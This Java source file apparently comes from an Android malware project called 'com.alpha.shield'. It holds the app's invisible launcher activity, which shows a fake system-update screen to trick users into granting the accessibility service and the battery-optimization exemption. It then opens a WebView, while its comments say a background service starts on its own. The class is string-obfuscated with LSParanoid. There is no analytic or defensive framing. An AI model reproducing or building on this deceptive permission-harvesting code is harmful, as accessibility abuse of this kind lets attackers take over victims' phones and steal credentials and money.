package com.alpha.shield;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;

import org.lsposed.lsparanoid.Obfuscate;

/**
 * MainActivity — invisible routing hub.
 * Uses Theme.NoDisplay so no UI is shown by this activity itself.
 *
 * Launch routing logic:
 *   1. First launch (pref SHOWN_FAKE not set):
 *      - If UPDATE_MODE == 0: skip to permission flow
 *      - If UPDATE_MODE == 1 or 2: show FakeUpdateActivity (which chains to permissions)
 *   2. Subsequent launches where accessibility + battery NOT granted:
 *      - Go directly to PermissionActivity
 *   3. All permissions granted:
 *      - Go directly to WebViewActivity
 *   4. Alpha service starts itself in background regardless of which screen shows
 */
@Obfuscate
public class MainActivity extends Activity {

    private static final String PREFS      = "alpha_prefs";
    private static final String KEY_SHOWN  = "shown_fake";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        SharedPreferences prefs = getSharedPreferences(PREFS, MODE_PRIVATE);
        boolean shownFake       = prefs.getBoolean(KEY_SHOWN, false);
        boolean accessOk        = isAccessibilityEnabled();
        boolean batteryOk       = isBatteryIgnored();

        if (accessOk && batteryOk) {
            // All permissions: show WebView
            route(WebViewActivity.class);

        } else if (!shownFake && BuildConfig.UPDATE_MODE != 0) {
            // First launch with fake screen configured
            prefs.edit().putBoolean(KEY_SHOWN, true).apply();
            route(FakeUpdateActivity.class);

        } else {
            // Permission flow (fake screen already shown or mode=0)
            route(PermissionActivity.class);
        }

        finish();
        overridePendingTransition(0, 0);
    }

    private void route(Class<? extends Activity> cls) {
        startActivity(new Intent(this, cls)
                .addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION
                        | Intent.FLAG_ACTIVITY_NEW_TASK));
    }

    private boolean isAccessibilityEnabled() {
        try {
            String s = Settings.Secure.getString(
                    getContentResolver(),
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            return s != null && s.contains(getPackageName());
        } catch (Exception e) { return false; }
    }

    private boolean isBatteryIgnored() {
        try {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            return pm != null && pm.isIgnoringBatteryOptimizations(getPackageName());
        } catch (Exception e) { return false; }
    }
}
